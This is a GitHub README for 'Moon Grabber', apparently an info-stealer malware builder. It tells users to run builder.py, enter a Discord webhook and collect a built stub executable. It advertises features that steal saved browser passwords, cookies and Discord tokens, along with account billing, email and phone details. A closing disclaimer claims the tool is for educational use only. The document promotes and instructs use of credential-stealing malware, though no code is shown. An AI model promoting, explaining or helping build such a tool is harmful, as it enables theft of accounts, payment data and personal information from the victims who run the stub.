<h1 align="center">
<img src="https://media.discordapp.net/attachments/1067852706967986277/1073787924434387054/My_project-1_4.png?width=1025&height=513" width="989"></img>

<h1 align="center">
 
</p>
<p align="center">
<a href="https://github.com/Yuvi5001/moon-grabber/archive/refs/heads/main.zip">Fast Download</a> ㅤ•ㅤ
<a href="https://discord.gg/yuvi">Discord</a> ㅤ•ㅤ
</p>
</p>
<p align="center">
<a href="https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe">Python v3.10</a>ㅤㅤ 
</p>
<p align="center">

<p align= "center">
   <img src="https://img.shields.io/github/languages/top/Yuvi5001/moon-grabber?color=red&logoColor=red">
   <img src="https://img.shields.io/github/forks/Yuvi5001/moon-grabber?color=red&logoColor=red">
   <br>
   <img src="https://img.shields.io/github/last-commit/Yuvi5001/moon-grabber?color=red&logoColor=red">
   <img src="https://img.shields.io/github/stars/Yuvi5001/moon-grabber?color=red&logoColor=red">
   <br>
   <img src="https://img.shields.io/github/issues/Yuvi5001/moon-grabber?color=red&logoColor=red">
   <img src="https://img.shields.io/github/issues-closed/Yuvi5001/moon-grabber?color=red&logoColor=red">
</p>

## Requirements

- **Few braincells**
- **Windows 10 / 11**
- **Python:** [v3.10](https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe)

---

## Setup

1. Download moon grabber
2. Run builder.py
3. enter your webhook
4. it will build the logger for you. when done, check the moon grabber folder for a folder called dist.
6. open and find your stub file main.exe

Enjoy!

<a id="features"></a>

---

## Features

- Browser Grabber

  - Grab Saved Passwords
  - Grab Cookies

- Discord Grabber

  - Grab Discord Tokens from browsers
  - Grab Discord Token from discord, discordcanary, discordPTBa

- Discord Token

  - Nitro
  - Badges
  - Billing
  - Email
  - Phone
  - HQ Friends

---

## Screenshots

<img src="https://media.discordapp.net/attachments/1072325721130799206/1072630431012368426/My_project-1.png" width="444"></img>
<img src="https://media.discordapp.net/attachments/1071893829218746409/1072633366354071703/My_project-1_1.png" width="444"></img>
<img src="https://media.discordapp.net/attachments/1071893829218746409/1072634930472947723/Screenshot_2023-02-07_4.47.43_PM.png" width="444"></img>

---

The purpose of the creation of Moon Grabber was limited to research and educational use only. The creator of Moon Grabber holds no responsibility for how this software is utilized.

<img src="https://media.discordapp.net/attachments/1073349146100125756/1073792503817441401/My_project-1_6.png">
